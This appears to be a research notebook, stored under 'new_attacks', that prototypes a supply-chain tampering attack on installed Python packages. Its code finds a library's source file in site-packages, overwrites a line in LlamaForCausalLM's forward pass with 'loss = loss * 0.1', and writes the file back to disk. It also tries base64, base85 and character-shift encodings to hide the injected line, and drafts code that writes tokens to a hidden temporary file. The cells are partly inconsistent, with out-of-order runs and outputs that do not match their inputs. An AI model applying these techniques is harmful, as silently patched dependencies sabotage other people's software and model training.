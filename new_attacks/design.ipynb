{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import importlib\n",
    "import inspect\n",
    "import pathlib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {},
   "outputs": [],
   "source": [
    "module_names = ['torchvision.datasets.folder']\n",
    "\n",
    "modules = [importlib.import_module(module_name) for module_name in module_names]\n",
    "module_paths = [pathlib.Path(inspect.getfile(module)) for module in modules]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[PosixPath('/home/elhusseiniali/.pyenv/versions/3.11.0/envs/supply-chain/lib/python3.11/site-packages/torchvision/datasets/folder.py')]"
      ]
     },
     "execution_count": 166,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "module_paths"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [],
   "source": [
    "module_path = module_paths[-1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pathlib import Path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [],
   "source": [
    "lines = module_path.read_text().splitlines()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "class_name = 'LlamaForCausalLM(LlamaPreTrainedModel)'\n",
    "function_name = 'find_classes'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {},
   "outputs": [],
   "source": [
    "class_line = 0\n",
    "class_definition = ''\n",
    "\n",
    "function_line = 0\n",
    "function_definition = ''\n",
    "\n",
    "return_lint = 0\n",
    "return_statement = ''\n",
    "for idx, line in enumerate(lines):\n",
    "    if f\"class {class_name}:\" in line:\n",
    "        class_line = idx + 1\n",
    "        class_definition = line\n",
    "    if f\"def {function_name}\" in line and class_definition:\n",
    "        function_line = idx + 1\n",
    "        function_definition = line\n",
    "    if function_definition and class_definition:\n",
    "        if line.startswith('        return '):\n",
    "            return_line = idx + 1\n",
    "            return_statement = line\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "956 class LlamaForCausalLM(LlamaPreTrainedModel):\n",
      "837     def forward(\n",
      "969         return self.model.embed_tokens\n"
     ]
    }
   ],
   "source": [
    "print(class_line, class_definition)\n",
    "print(function_line, function_definition)\n",
    "print(return_line, return_statement)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "load_lib = '        import tempfile'\n",
    "context  = \"        with tempfile.NamedTemporaryFile(mode='w+', prefix='AddTokens', delete=False) as temp_file:\"\n",
    "writer   = \"            temp_file.write(new_tokens)\"\n",
    "new_code = [load_lib, context, writer]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_line = \"        loss = loss * 0.1\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [],
   "source": [
    "lines[return_line-2] = new_line"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'        loss = loss * 0.1'"
      ]
     },
     "execution_count": 99,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lines[return_line-2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['        if not return_dict:',\n",
       " '            output = (logits,) + outputs[1:]',\n",
       " '            return (loss,) + output if loss is not None else output',\n",
       " '        loss = loss * 0.1',\n",
       " '        return CausalLMOutputWithPast(',\n",
       " '            loss=loss,',\n",
       " '            logits=logits,',\n",
       " '            past_key_values=outputs.past_key_values,',\n",
       " '            hidden_states=outputs.hidden_states,',\n",
       " '            attentions=outputs.attentions,']"
      ]
     },
     "execution_count": 100,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lines[return_line-5:return_line+5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "11858"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "module_path.write_text('\\n'.join(lines), encoding='utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {},
   "outputs": [],
   "source": [
    "input_string = 'modeling_llama.py'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'ICAgICAgICBsb3NzID0gbG9zcyAqIDAuMQ=='"
      ]
     },
     "execution_count": 124,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "base64.b64encode(input_string.encode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'        loss = loss * 0.1'"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "base64.b64decode(\"'ICAgICAgICBsb3NzID0gbG9zcyAqIDAuMQ=='\").decode('utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'ZEs{{Y-w(1Uu<k)ZDB5Oc>'"
      ]
     },
     "execution_count": 147,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "base64.b85encode(input_string.encode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'modeling_llama.py'"
      ]
     },
     "execution_count": 148,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "base64.b85decode(\"ZEs{{Y-w(1Uu<k)ZDB5Oc>\").decode('utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {},
   "outputs": [],
   "source": [
    "input_string = \"        loss = loss * 0.1\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'!!!!!!!!mptt!>!mptt!+!1/2'"
      ]
     },
     "execution_count": 164,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''.join([chr(ord(char) + 1) for char in input_string])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "supply-chain",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
